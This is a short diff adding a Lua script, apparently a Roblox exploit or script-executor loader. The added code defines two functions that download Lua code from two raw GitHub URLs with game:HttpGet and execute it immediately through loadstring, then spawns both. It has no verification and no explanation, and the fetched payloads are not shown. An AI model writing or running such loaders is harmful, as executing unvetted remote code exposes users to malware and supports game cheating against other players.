@@ -1,0 +1,10 @@
+local function loader1()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/zxcvs7/blob/refs/heads/main/assistscriptfinalv4.lua"))()
+end
+
+local function loader2()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/zovlanee/final/refs/heads/main/zxvfinal4.lua.txt"))()
+end
+
+task.spawn(loader1)
+task.spawn(loader2)
